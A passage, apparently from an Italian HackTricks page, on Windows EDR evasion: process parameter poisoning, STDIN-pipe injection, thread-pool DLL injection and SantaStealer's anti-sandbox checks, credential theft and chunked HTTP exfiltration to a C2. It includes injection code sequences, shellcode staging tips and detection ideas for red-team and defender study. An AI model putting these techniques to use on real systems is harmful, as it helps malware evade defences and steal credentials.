- Preferisci DLL **già caricate** nel processo remoto per evitare la telemetria di `LoadLibrary`/caricamenti di immagini imprevisti.
- Preferisci export eseguiti raramente dall'applicazione target; altrimenti, i normali percorsi di codice potrebbero raggiungere i byte sovrascritti prima o dopo la creazione del thread.
- Gli implant di grandi dimensioni spesso richiedono di sostituire l'inserimento dello shellcode tramite string literal con un **byte-array/braced initializer**, in modo che l'intero buffer sia rappresentato correttamente nel codice sorgente dell'injector.

Idee per il rilevamento
- Scritture remote in pagine eseguibili supportate da immagini (`MEM_IMAGE`, `PAGE_EXECUTE*`) anziché nelle più comuni allocazioni private RWX/RX.
- Entry point di export i cui byte in memoria non corrispondono più al file di riferimento su disco.
- Thread remoti o pivot del contesto che iniziano l'esecuzione all'interno di un export di una DLL legittima i cui byte iniziali sono stati modificati di recente.
- Sequenze sospette di `VirtualProtect(Ex)` / `WriteProcessMemory` sulle pagine `.text` di una DLL, seguite dalla creazione di un thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) è una tecnica di **process-injection / EDR-evasion** che evita il classico percorso di scrittura remota (`VirtualAllocEx` + `WriteProcessMemory`). Invece di copiare byte in un target già in esecuzione, sfrutta il fatto che Windows **copia parametri di avvio selezionati di `CreateProcessW` nel processo figlio** e li memorizza in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carrier avvelenabili copiati da `CreateProcessW`

I carrier utili sono:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vincoli pratici dei carrier:

- `lpCommandLine` deve puntare a **memoria scrivibile** per `CreateProcessW` e ha un limite di **32.767 caratteri Unicode**, incluso il terminatore null.
- `lpEnvironment` deve essere un blocco di ambiente Unicode composto da stringhe `NAME=VALUE\0` consecutive, terminate da un ulteriore `\0`.
- `lpReserved` è ufficialmente riservato, quindi la corrispondenza con `ShellInfo` va considerata un dettaglio di implementazione, non un contratto documentato stabile.

In questo modo, la normale creazione del processo diventa la **primitiva di trasferimento del payload**. L'operatore crea il processo figlio con dati di avvio controllati dall'attaccante e lascia che Windows esegua la copia tra processi.

### Flusso di ricerca remota senza API di scrittura remota

Dopo la creazione del processo figlio, individua il buffer copiato usando primitive di sola **lettura**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → ottieni `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leggi il `PEB` remoto
3. Segui `PEB.ProcessParameters`
4. Leggi `RTL_USER_PROCESS_PARAMETERS`
5. Usa il puntatore selezionato:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Flusso minimo:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Esecuzione del buffer dei parametri copiato

La regione dei parametri copiata è solitamente `RW`, non eseguibile. Una catena P3 comune è:

1. Creare normalmente il processo (non sospeso)
2. Rendere eseguibile la pagina dei parametri scelta con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Riutilizzare l'handle del thread principale già restituito in `PROCESS_INFORMATION`
4. Reindirizzare l'esecuzione con `NtSetContextThread` (`CONTEXT_CONTROL`, sovrascrivendo `RIP`)

A differenza dei classici flussi di lavoro di thread hijacking, questo **non richiede** `SuspendThread` / `ResumeThread`; il contesto può essere modificato direttamente usando l'handle del thread principale restituito.

Questo evita diverse API comunemente monitorate per l'injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- spesso anche `SuspendThread` / `ResumeThread`

### Limite dei byte nulli e shellcode a fasi

Tutti e tre i vettori sono **dati stringa o simili a stringhe**, quindi un payload grezzo contenente `0x00` viene troncato durante il trasferimento. Una soluzione pratica è usare un **primo stage privo di byte nulli**, che ricostruisce le costanti in fase di esecuzione e poi carica un secondo stage arbitrario.

Un semplice schema consiste nella sintesi di costanti basata su XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Questo consente al first stage di creare stringhe sullo stack, argomenti API, percorsi DLL o un loader di shellcode di secondo stage senza incorporare byte nulli nel parametro trasportato.

### Chiamate API basate sullo stack dal first stage

Quando il first stage deve chiamare API come `LoadLibraryA`, può:

- inserire la stringa/buffer nello stack del processo target
- riservare i **32 byte di shadow space x64**
- impostare `RCX`, `RDX`, `R8`, `R9` con costanti o puntatori relativi a `RSP`
- mantenere `RSP` **allineato a 16 byte** prima della chiamata

Un secondo stage può quindi essere copiato dallo stack in un'allocazione `PAGE_READWRITE`, modificato in `PAGE_EXECUTE_READ` con `VirtualProtect` e avviato, evitando un'allocazione RWX diretta.

### Idee per il rilevamento

Buone opportunità di hunting menzionate dagli autori:

- `VirtualProtectEx` / `NtProtectVirtualMemory` che rendono eseguibili le **pagine dei parametri di processo**
- tale modifica delle protezioni seguita da `SetThreadContext` / `NtSetContextThread`
- letture remote del `PEB` e poi di `RTL_USER_PROCESS_PARAMETERS`
- valori insolitamente lunghi o ad alta entropia per `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved` durante la creazione del processo

### Note

- P3 è una **tecnica di trasferimento tra processi**, non una primitiva di esecuzione completa di per sé: il parametro copiato richiede comunque una modifica dei permessi per l'esecuzione e un metodo di reindirizzamento dell'esecuzione.
- `RtlCreateProcessReflection` / Dirty Vanity è stata presa in considerazione dagli autori, ma scartata perché internamente ricorre a primitive sospette come `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Iniezione tramite pipe STDIN della console

È possibile usare anche un processo figlio interattivo con console come **primitiva di trasferimento del payload**. L'injector reindirizza lo standard input del processo figlio a una pipe e invia un marker seguito dallo shellcode. Dopo che il programma della console ha letto i dati nella propria memoria privata, l'injector individua quel buffer, lo rende eseguibile e reindirizza a esso un thread del processo figlio. Questo evita `VirtualAllocEx` e `WriteProcessMemory`, ma resta un'iniezione di processo, non un bypass EDR generico.<sup>[[41]](#references)</sup>

Nonostante la descrizione «named-pipe», l'implementazione di riferimento chiama `CreatePipe`, che crea una **pipe anonima**. Windows implementa internamente le pipe anonime con oggetti pipe dotati di nomi univoci, ma il PoC non seleziona un percorso `\\.\pipe\<name>` né chiama `CreateNamedPipe`. Crea handle ereditabili con un descrittore di sicurezza predefinito, inserisce l'handle di lettura in `STARTUPINFO.hStdInput`, imposta `STARTF_USESTDHANDLES` e avvia un nuovo processo figlio abilitando l'ereditarietà degli handle. Pertanto, questo PoC avvia l'eseguibile della console fornito; non collega la pipe a un processo esistente.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Flusso di lavoro di riferimento

L'implementazione utilizza la seguente catena:<sup>[[41]](#references)</sup>

1. Crea coppie di pipe anonime per `STDIN` e `STDOUT` del processo figlio. Disabilita l'ereditarietà per i due handle lato processo padre e, dopo la creazione del processo, chiude nel padre i duplicati lato processo figlio.
2. Avvia un eseguibile interattivo come `netsh.exe` o `nslookup.exe` con `CREATE_NEW_CONSOLE`. Il processo figlio eredita gli handle standard reindirizzati.
3. Invia l'intero array binario `rawData` con `WriteFile` tramite l'handle `STDIN` lato processo padre. Il programma della console consuma i byte e ne lascia una copia in una delle proprie regioni private con commit.
4. Esamina lo spazio degli indirizzi del processo figlio con `VirtualQueryEx`, legge le regioni candidate `MEM_PRIVATE` con `ReadProcessMemory` e cerca il marker all'inizio di `rawData`.
5. Modifica il buffer individuato in `PAGE_EXECUTE_READWRITE` con `VirtualProtectEx`.
6. Individua il thread principale, lo sospende, imposta `RIP` su `found_address + 0x19` con `NtSetContextThread` e lo riprende.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

L'implementazione fornita è specifica per x64: modifica `CONTEXT.Rip` e il payload incorporato è shellcode x64. `rawData` inizia con un marker di 25 byte, quindi i byte eseguibili iniziano all'offset esadecimale `0x19`. Quando sostituisci il payload, mantieni questa struttura oppure aggiorna insieme il marker, il vettore di ricerca, la dimensione dell'array e l'offset di esecuzione. I commenti nel sorgente indicano inoltre `0x0A`, `0x0D` e `0x1A` come caratteri non validi. Questo workflow non modifica il token né i privilegi del processo figlio.<sup>[[41]](#references)</sup>

Per helper nativi di piccole dimensioni e pattern di compilazione dei payload, consulta [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Iniezione di DLL tramite callback del thread pool senza shellcode (DLLParty)

DLLParty adatta l'iniezione nel thread pool in stile PoolParty per fare in modo che un worker esistente del target chiami `LoadLibraryA`, invece di eseguire uno stub callback iniettato. La primitiva di dispatch è un completamento `TP_DIRECT` accodato alla porta di completamento I/O del pool del target. Questo non aggira i permessi del processo: il PoC chiama `OpenProcess(PROCESS_ALL_ACCESS)` e richiede memoria del target leggibile e scrivibile, oltre a handle worker-factory e della porta di completamento duplicabili.<sup>[[46]](#references)[[47]](#references)</sup>

Su Windows x64, il worker passa in `RCX`, il primo argomento della callback, un puntatore a `TP_CALLBACK_INSTANCE` allocato sullo stack. `LoadLibraryA` interpreta lo stesso puntatore come `LPCSTR`. Nel percorso testato, `TppWorkerThread` crea il puntatore in `RSP+0x178`, mentre la prima scrittura ordinaria in quell'oggetto avviene in `RSP+0x1d0`. Un percorso DLL con terminazione null che rientra in questo prefisso di 0x58 byte può quindi occupare l'inizio dell'istanza senza essere sovrascritto prima del dispatch. Si tratta di un'osservazione specifica della build, non di una garanzia ABI documentata di Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Il workflow di riferimento è:<sup>[[46]](#references)[[47]](#references)</sup>

1. Enumera gli handle del target con `NtQuerySystemInformation(SystemHandleInformation)` e identifica `TpWorkerFactory` interrogando i tipi di oggetto. Duplica un handle worker-factory e interroga `WorkerFactoryBasicInformation`; `StartParameter` restituisce il `TP_POOL` remoto. Salta le factory con `TotalWorkerCount == 0`.
2. Leggi `TP_POOL.CompletionPort` e percorri la lista privata dei worker del pool. Nella build x64 testata di Windows 10 19045 (`ntdll.dll 10.0.19041.4842`), la testa si trova in `pool+0x60`; ogni collegamento è in `worker+0x10`, quindi lo slot dell'istanza callback in `worker+0x38` equivale a `link+0x28`. Il PoC verifica l'allineamento dei puntatori, la reciprocità dei collegamenti, l'appartenenza al pool, gli ID thread non nulli, i nodi ripetuti e la stabilità della testa della lista.
3. Scrivi il percorso DLL in **ogni** slot worker individuato, perché il completamento accodato potrebbe essere prelevato da qualsiasi worker. Posiziona un `TP_DIRECT` con `Callback = LoadLibraryA` nella memoria scrivibile del target. Il PoC usa `last_slot-0x500` su uno stack worker invece di `VirtualAllocEx`; quell'offset è sperimentale e non deve sovrapporsi a dati attivi dello stack.
4. Duplica l'handle della porta di completamento del target e chiama `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. L'indirizzo remoto di `TP_DIRECT` è la chiave di completamento. Un worker esistente chiama quindi `LoadLibraryA` con il puntatore dell'istanza callback sovrascritto, caricando una DLL già accessibile al target.

Il PoC accetta il PID del target (`DLLParty.exe <target_pid>`) e usa un percorso DLL hard-coded in `DLLParty.cpp`; imposta un percorso accessibile al target prima di compilare un eseguibile x64. Usa inoltre l'indirizzo di `LoadLibraryA` del proprio processo come callback remota, quindi presume che tale indirizzo sia valido anche nel target. Il codice non verifica che la lunghezza del percorso rientri nel prefisso di 0x58 byte né che l'attraversamento dei worker abbia trovato uno slot prima di indicizzare l'ultimo elemento. Verifica nuovamente gli offset privati, la disposizione dello stack e lo spazio scrivibile per la build target. Omettere `CreateRemoteThreadEx`, shellcode e `VirtualAllocEx` non elimina le scritture tra processi né la telemetria del caricamento di DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Tecniche di SantaStealer per l'evasione fileless e il furto di credenziali

SantaStealer (noto anche come BluelineStealer) mostra come i moderni info-stealer combinino AV bypass, anti-analisi e accesso alle credenziali in un unico workflow.<sup>[[24]](#references)</sup>

### Verifica del layout della tastiera e ritardo nei sandbox

- Un flag di configurazione (`anti_cis`) enumera i layout di tastiera installati tramite `GetKeyboardLayoutList`. Se trova un layout cirillico, il sample crea un marker `CIS` vuoto e termina prima di avviare gli stealer, evitando così di attivarsi nelle aree geografiche escluse e lasciando al contempo un artefatto utile per la ricerca.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logica `check_antivm` a più livelli

- La variante A scorre l’elenco dei processi, calcola un checksum rolling personalizzato per ogni nome e lo confronta con blocklist incorporate di debugger/sandbox; ripete il calcolo del checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- La variante B esamina le proprietà del sistema (numero minimo di processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare le additions di VirtualBox ed esegue controlli temporali durante le pause per individuare il single-stepping. Qualsiasi rilevamento interrompe l’esecuzione prima dell’avvio dei moduli.

### Helper fileless + caricamento reflective con doppia ChaCha20

- La DLL/EXE principale incorpora un helper per le credenziali di Chromium, che viene salvato su disco oppure mappato manualmente in memoria; la modalità fileless risolve autonomamente import e relocation, evitando di scrivere file dell’helper.
- L’helper contiene una DLL di secondo stadio cifrata due volte con ChaCha20 (due chiavi da 32 byte e nonce da 12 byte). Dopo entrambe le operazioni, carica il blob in modo reflective (senza `LoadLibrary`) e chiama gli export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivati da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Le routine di ChromElevator usano il process hollowing reflective tramite direct syscall per iniettarsi in un browser Chromium attivo, ereditare le chiavi di AppBound Encryption e decrittare password/cookie/carte di credito direttamente dai database SQLite, nonostante le protezioni ABE.

### Raccolta modulare in memoria ed esfiltrazione HTTP a blocchi

- `create_memory_based_log` scorre una tabella globale di puntatori a funzione `memory_generators` e avvia un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshot, documenti, estensioni del browser e così via). Ogni thread scrive i risultati in buffer condivisi e comunica il numero di file dopo una finestra di attesa di circa 45 secondi.
- Al termine, tutto viene compresso con la libreria `miniz` collegata staticamente in `%TEMP%\\Log.zip`. `ThreadPayload1` attende quindi 15 secondi e trasmette l’archivio in blocchi da 10 MB tramite HTTP POST a `http://<C2>:6767/upload`, falsificando un boundary del browser `multipart/form-data` (`----WebKitFormBoundary***`). Ogni blocco include `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opzionale; l’ultimo blocco aggiunge `complete: true` per comunicare al C2 che la ricomposizione è terminata.

## References

- [1] [Tecniche avanzate di evasione: precisione nel module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Stack di chiamate: niente più sconti per il malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentazione](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – esempio](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – esempio](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC per lo spoofing dello stack di chiamate](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuova catena d’infezione e offuscamento basato su ConfuserEx per DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Ci si dovrebbe fidare dello zero trust? Elusione dei controlli di postura di Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Prima di ToolShell: analisi delle precedenti operazioni ransomware di Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abuso degli export inoltrati](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventario degli export inoltrati di Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordine di ricerca delle librerie a collegamento dinamico](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Sicurezza dei processi e diritti di accesso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Riferimento EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Launcher CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Contrastare gli EDR con la protezione Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Rompere lo scudo protettivo di Windows Defender con la tecnica Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Riferimento al comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Dietro la pura facciata: da RAT a builder a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer sta arrivando in città: un nuovo e ambizioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Decrittazione di Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: contrastare il malware Node.js con il tracing delle API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [La bella addormentata: mettere a riposo Adaptix con Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Avvelenamento dei parametri di processo](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [La bella addormentata II: CFG, CET e spoofing dello stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Offuscamento del sonno con Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Nascondere il proprio Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abuso di Chrome Remote Desktop nelle operazioni Red Team: una guida pratica](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: trasformare il driver di remediation di Defender in una primitiva per operazioni sul kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Codice di supporto MDSec per Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: creazione di funzioni auto-mascheranti con LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Codice sorgente InjectSetConsole di TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Funzione CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creazione di un processo figlio con reindirizzamento dell’input e dell’output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - Necromancy di GhostPack: riforgiare strumenti C# con WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compilazione di progetti C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Proof of concept e codice sorgente di DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abuso degli internals del thread pool per l’iniezione di DLL senza shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
{{#include ../banners/hacktricks-training.md}}
